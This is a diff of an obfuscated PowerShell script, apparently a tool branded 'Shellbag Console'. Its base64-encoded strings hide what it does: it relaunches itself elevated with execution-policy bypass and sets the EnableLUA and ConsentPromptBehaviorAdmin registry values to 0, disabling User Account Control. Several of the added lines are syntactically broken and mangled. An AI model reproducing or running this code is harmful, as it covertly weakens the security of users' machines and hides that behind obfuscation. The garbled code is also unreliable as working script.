@@ -1,5 +1,5 @@
-if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRtaW5pc3RyYXRvcg=='))))) {
-    Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IFJlcXVlc3RpbmcgQWRtaW4gcHJpdmlsZWdlcy4uLg==')))
+if (-NOT ([Security.Principal.WindowsPrincipal] [Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('QWRtaW5pc3RyYXRvcg=='))))) 
+    Write-Host [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('W0tSQV06IFJlcXVlc3RpbmcgQWRtaW4gcHJpdmlsZWdlcy4uLg=='))
     $arguments = ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('LU5vUHJvZmlsZSAtRXhlY3V0aW9uUG9saWN5IEJ5cGFzcyAtRmlsZSBg')))(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICsg'))) + $MyInvocation + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Lk15Q29tbWFuZC5QYXRoICsg'))))`"(([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQogICAgU3RhcnQtUHJvY2VzcyBQb3dlclNoZWxsIC1WZXJiIFJ1bkFzIC1Bcmd1bWVudExpc3Qg'))) + $arguments + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQogICAgRXhpdA0KfQ0KDQoNCldyaXRlLUhvc3Qg'))))STARTED (([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('DQoNCg=='))) + $uacPath + ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ID0g'))))HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System"
 Set-ItemProperty -Path $uacPath -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('RW5hYmxlTFVB'))) -Value 0 -Force
 Set-ItemProperty -Path $uacPath -Name ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('Q29uc2VudFByb21wdEJlaGF2aW9yQWRtaW4='))) -Value 0 -Force
@@ -45,11 +45,10 @@ YMMMUP^
 "@ -split ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('YG4=')))
     
     $lineY = 0
-    for ($i_90747 = 0; $i_90747 -lt $headerArt.Count; $i_90747++) {
-    $line = $headerArt[$i_90747];
-    Write-Host $line -ForegroundColor Red
+    foreach ($line in $headerArt) {
+        Write-Host $line -ForegroundColor Red
         $lineY++
-}
+    }
     
     Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09PT09'))) -ForegroundColor Magenta
     Write-Host ([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ICAgICAgICAgIFNIRUxMQkFHIENPTlNPTEUgLSBSRUxFQVNFIEVESVRJT04gICAgICAgICA='))) -ForegroundColor Yellow
